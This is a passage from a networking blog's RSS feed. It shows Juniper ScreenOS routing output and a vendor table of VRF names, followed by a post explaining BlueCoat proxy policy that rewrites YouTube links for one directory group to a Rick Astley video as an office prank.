  eth0/5       N/A                               N/A         N/A               -   D   -
  eth0/6       N/A                               N/A         N/A               -   D   -
bgroup1        0.0.0.0/0                         Null        0017.cb80.9f4c    -   D   -  
bgroup2        0.0.0.0/0                         Null        0017.cb80.9f4d    -   D   -  
bgroup3        0.0.0.0/0                         Null        0017.cb80.9f4e    -   D   -  
vlan1          0.0.0.0/0                         VLAN        0017.cb80.9f4f    1   D   -  
null           0.0.0.0/0                         Null        N/A               -   U   0  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now the routing instances:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get route
H: Host C: Connected S: Static A: Auto-Exported
I: Imported R: RIP P: Permanent D: Auto-Discovered
N: NHRP
iB: IBGP eB: EBGP O: OSPF E1: OSPF external type 1
E2: OSPF external type 2 trailing B: backup route


IPv4 Dest-Routes for &amp;lt;untrust-vr&amp;gt; (2 entries)
;--------------------------------------------------------------------------------------
         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr     Vsys
;--------------------------------------------------------------------------------------
*         2      10.10.10.1/32       eth0/0.1         0.0.0.0   H    0      0     Root
*         1      10.10.10.0/24       eth0/0.1         0.0.0.0   C    0      0     Root



IPv4 Dest-Routes for &amp;lt;trust-vr&amp;gt; (8 entries)
;--------------------------------------------------------------------------------------
         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr     Vsys
;--------------------------------------------------------------------------------------
*         5     172.16.10.0/24       eth0/0.2         0.0.0.0   C    0      0     Root
*         8    192.168.10.1/32       eth0/0.4         0.0.0.0   H    0      0     Root
*         4     192.168.1.1/32        bgroup0         0.0.0.0   H    0      0     Root
          2     192.168.2.1/32    wireless0/0         0.0.0.0   H    0      0     Root
          1     192.168.2.0/24    wireless0/0         0.0.0.0   C    0      0     Root
*         3     192.168.1.0/24        bgroup0         0.0.0.0   C    0      0     Root
*         7    192.168.10.0/24       eth0/0.4         0.0.0.0   C    0      0     Root
*         6     172.16.10.1/32       eth0/0.2         0.0.0.0   H    0      0     Root



IPv4 Dest-Routes for &amp;lt;dmz-vr&amp;gt; (2 entries)
;--------------------------------------------------------------------------------------
         ID          IP-Prefix      Interface         Gateway   P Pref    Mtr
;--------------------------------------------------------------------------------------
*         2      10.10.10.1/32       eth0/0.3         0.0.0.0   H    0      0         
*         1      10.10.10.0/24       eth0/0.3         0.0.0.0   C    0      0         


&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;Based on the findings of the report, my conclusion was that this idea was not
a practical deterrent for reasons which at this moment must be all too obvious.&lt;/p&gt;

&lt;p&gt;Dr. Strangelove&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;footnotes:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Footnotes&lt;/h2&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Vendor&lt;/th&gt;
&lt;th&gt;OS&lt;/th&gt;
&lt;th&gt;VRF-Lite&lt;/th&gt;
&lt;th&gt;VRF&lt;/th&gt;
&lt;th&gt;Notes&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Juniper&lt;/td&gt;
&lt;td&gt;JunOS&lt;/td&gt;
&lt;td&gt;Virtual Router&lt;/td&gt;
&lt;td&gt;VRF&lt;/td&gt;
&lt;td&gt;JunOS has many others ways of preforming VRF functions. More details &lt;a href=&#34;http://www.juniper.net/techpubs/software/junos/junos85/swconfig85-vpns/frameset.html&#34;&gt;here&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Juniper&lt;/td&gt;
&lt;td&gt;ScreenOS&lt;/td&gt;
&lt;td&gt;Virtual Router&lt;/td&gt;
&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Cisco&lt;/td&gt;
&lt;td&gt;IOS&lt;/td&gt;
&lt;td&gt;VRF Lite&lt;/td&gt;
&lt;td&gt;VRF&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Cisco&lt;/td&gt;
&lt;td&gt;NX-OS&lt;/td&gt;
&lt;td&gt;VRF Lite&lt;/td&gt;
&lt;td&gt;VRF&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Cisco&lt;/td&gt;
&lt;td&gt;ASA&lt;/td&gt;
&lt;td&gt;Contexts&lt;/td&gt;
&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Cisco&lt;/td&gt;
&lt;td&gt;PIXOS&lt;/td&gt;
&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;em&gt;N/A&lt;/em&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;footnotes&#34;&gt;

&lt;hr /&gt;

&lt;ol&gt;
&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;MAN is a Metropolitan Area Network: &lt;a href=&#34;http://en.wikipedia.org/wiki/Metropolitan_Area_Network&#34;&gt;Wikipedia&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;I should take a second and also point out that Cisco has a long and &lt;em&gt;s.l.o.w&lt;/em&gt; history of making managements services available via a vrf.  In fact, so many features cannot be enabled inside a VRF that most just use the global routing table for management and push all production traffic into VRFs.
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;Table of Vender and VRF naming conventions
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;Yes, yes. I know I could do everything at once and commit last, and that is one of the reasons I love JunOS, but this is also about building and seeing each change and how it affects the overall router
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>RickRoll Everyone with BlueCoat</title>
      <link>https://jeremyrossi.com/blog/2009/03/16/rickroll-everyone-with-bluecoat/</link>
      <pubDate>Mon, 16 Mar 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/03/16/rickroll-everyone-with-bluecoat/</guid>
      <description>

&lt;h3 id=&#34;bluecoat-proxy:691bb6c52833216ab2a99f88295d4f41&#34;&gt;BlueCoat Proxy&lt;/h3&gt;

&lt;p&gt;The &lt;a href=&#34;http://www.bluecoat.com/products/sg&#34;&gt;Bluecoat SGOS&lt;/a&gt; can do a fair amount
of stuff just like any web-proxy should, but my favorite is to
&lt;a href=&#34;http://en.wikipedia.org/wiki/Rickrolling&#34;&gt;RickRoll&lt;/a&gt; the whole
company.  ( &lt;em&gt;People spend to much time on youtube as is&lt;/em&gt; ).&lt;/p&gt;

&lt;p&gt;In this example users are authenticated with NTML back ended by Windows
Active Directory. See the docs from Bluecoat on how to set this up.&lt;/p&gt;

&lt;h4 id=&#34;definitions-conditions:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Definitions Conditions&lt;/h4&gt;

&lt;p&gt;Conditions allow you to control when things should happen. They do
nothing by themselves, but get put together later to preform some real
fun.&lt;/p&gt;

&lt;p&gt;The first definition here matches only member of the group
&lt;code&gt;DOMAINpxy_rickrolld&lt;/code&gt;. You could make this users or just about that
think you would like. I choice the group method to make it simple to add
and remove effected users.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define condition group_to_be_rickrolled realm=active_directory
  group=DOMAIN\pxy_rickrolld end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The second definition just matches does a REGEX to match the domain
&amp;ldquo;&lt;code&gt;youtube&lt;/code&gt;&amp;rdquo; and looks for the string &amp;ldquo;&lt;code&gt;watch&lt;/code&gt;&amp;rdquo; in the url path. The use
of REGEX really is not the best way to do this, but I figured showing
both methods of matching was worth the slight performance hit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define condition match_url_to_rickroll
    url.host.regex=&amp;quot;youtube&amp;quot; url.path.substring=watch 
end
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;definitions-actions:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Definitions Actions&lt;/h4&gt;

&lt;p&gt;Actions are define something to do with a request. In this case
we are going to rewrite the request and change the video to the
&amp;ldquo;&lt;code&gt;oHg5SJYRHA0&lt;/code&gt;&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;define action youtube_change_to_rickroll
    rewrite( url, &amp;quot;(http://.*/watch?v=)([^&amp;amp;]+)(.*)&amp;quot;, &amp;quot;$(1)oHg5SJYRHA0$(3)&amp;quot; )
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Given the initial url of &amp;ldquo;&lt;code&gt;http://www.youtube.com/watch?v=OBghD0XBN5M&amp;amp;feature=related&lt;/code&gt;&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;The rewrite functions second argument is a REGEX that stores the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&amp;ldquo;&lt;code&gt;http://www.youtube.com/watch?v=&lt;/code&gt;&amp;rdquo; in variable &amp;ldquo;&lt;code&gt;$(1)&lt;/code&gt;&amp;rdquo;.&lt;/li&gt;
&lt;li&gt;&amp;ldquo;&lt;code&gt;&amp;amp;feature=related&lt;/code&gt;&amp;rdquo; in variable &amp;ldquo;&lt;code&gt;$(3)&lt;/code&gt;&amp;rdquo;.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The third argument is the Newly created url that simply puts the data
back together with our selected Video ID.&lt;/p&gt;

&lt;h4 id=&#34;proxy-section:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Proxy Section&lt;/h4&gt;

&lt;p&gt;Now that you have everything defined you need to put it all to use.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;lt;Proxy&amp;gt; 
    condition=match_url_to_rickroll condition=group_to_be_rickrolled 
action.youtube_change_to_rickroll(yes) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will pull all the define from above to select when to preform the
rewrite function. Putting this in place is fun, but it really does make
people mad for some reason.&lt;/p&gt;

&lt;h3 id=&#34;completed-fun:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Completed Fun&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;define condition group_to_be_rickrolled
    realm=active_directory group=DOMAIN\pxy_rickrolld 
end
define condition match_url_to_rickroll
    url.host.regex=&amp;quot;youtube&amp;quot; url.path.substring=watch 
end	
define action youtube_change_to_rickroll
    rewrite( url, &amp;quot;(http://.*/watch?v=)([^&amp;amp;]+)(.*)&amp;quot;, &amp;quot;$(1)oHg5SJYRHA0$(3)&amp;quot; )
end

&amp;lt;Proxy&amp;gt; 
    condition=match_url_to_rickroll condition=group_to_be_rickrolled action.youtube_change_to_rickroll(yes) 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;results:691bb6c52833216ab2a99f88295d4f41&#34;&gt;Results&lt;/h3&gt;

&lt;p&gt;Well of course it had to be done.&lt;/p&gt;

&lt;p&gt;&lt;object width=&#34;425&#34; height=&#34;344&#34;&gt;&lt;param name=&#34;movie&#34; value=&#34;http://www.youtube.com/v/oHg5SJYRHA0&amp;hl=en&amp;fs=1&#34;&gt;&lt;/param&gt;&lt;param name=&#34;allowFullScreen&#34; value=&#34;true&#34;&gt;&lt;/param&gt;&lt;param name=&#34;allowscriptaccess&#34; value=&#34;always&#34;&gt;&lt;/param&gt;&lt;embed src=&#34;http://www.youtube.com/v/oHg5SJYRHA0&amp;hl=en&amp;fs=1&#34; type=&#34;application/x-shockwave-flash&#34; allowscriptaccess=&#34;always&#34; allowfullscreen=&#34;true&#34; width=&#34;425&#34; height=&#34;344&#34;&gt;&lt;/embed&gt;&lt;/object&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>